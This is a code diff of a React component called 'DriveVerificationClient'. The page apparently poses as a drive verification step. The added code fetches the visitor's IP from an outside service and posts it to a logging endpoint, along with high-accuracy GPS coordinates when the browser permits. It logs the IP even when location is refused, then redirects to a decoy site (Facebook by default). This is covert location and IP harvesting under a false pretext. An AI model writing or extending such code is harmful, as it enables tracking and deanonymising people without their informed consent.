@@ -24,29 +24,43 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
-  const requestLocation = () => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          fetch('/api/log-location', {
+  const requestLocation = async () => {
+    let clientIp = 'N/A';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            clientIp = ipData.ip;
+        }
+    } catch(e) {
+        console.error("Could not fetch IP", e);
+    }
+
+    const logData = (pos?: GeolocationPosition) => {
+        const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
+        if (pos) {
+            body.lat = pos.coords.latitude;
+            body.lon = pos.coords.longitude;
+            body.acc = pos.coords.accuracy;
+        }
+
+        fetch('/api/log-location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              acc: pos.coords.accuracy,
-            }),
-          }).finally(() => {
+            body: JSON.stringify(body),
+        }).finally(() => {
             window.location.href = REDIRECT_URL;
-          });
-        },
-        () => {
-          window.location.href = REDIRECT_URL;
-        },
+        });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        logData, // Success callback
+        () => logData(), // Error callback
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
-      window.location.href = REDIRECT_URL;
+      logData(); // Geolocation not supported
     }
   };
 
